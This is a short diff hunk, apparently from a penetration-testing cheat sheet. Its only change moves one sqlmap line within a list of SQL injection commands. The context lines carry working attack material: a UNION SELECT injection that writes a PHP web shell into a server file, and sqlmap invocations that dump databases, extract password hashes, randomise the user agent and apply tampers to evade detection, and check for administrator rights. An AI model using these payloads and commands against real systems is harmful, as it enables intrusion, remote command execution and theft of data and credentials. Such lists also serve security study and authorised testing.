@@ -654,7 +654,6 @@ cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/va
 $ sqlmap -u <URL> --batch --dump
 $ sqlmap <URL> --data 'uid=1&name=test'
 $ sqlmap <URL> --data 'uid=1*&name=test'        # use * to specify the parameter to inject e.g. to test HTTP headers like cookie header 
-$ sqlmap <URL> --random-agent
 $ sqlmap <URL> --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 $ sqlmap -u <URL> --data='id=1' --method PUT
 $ sqlmap -u <URL> --batch -t /tmp/traffic.txt
@@ -679,6 +678,7 @@ $ sqlmap -u <URL> --passwords --batch
 $ sqlmap -u <URL> --passwords --batch --all
 $ sqlmap -u <URL> --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="<CSRF token parameter>"
 $ sqlmap -u <URL> --randomize=rp --batch -v 5 | grep URI
+$ sqlmap <URL> --random-agent
 $ sqlmap -u <URL> --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
 $ sqlmap --list-tampers
 $ sqlmap -u <URL> --is-dba
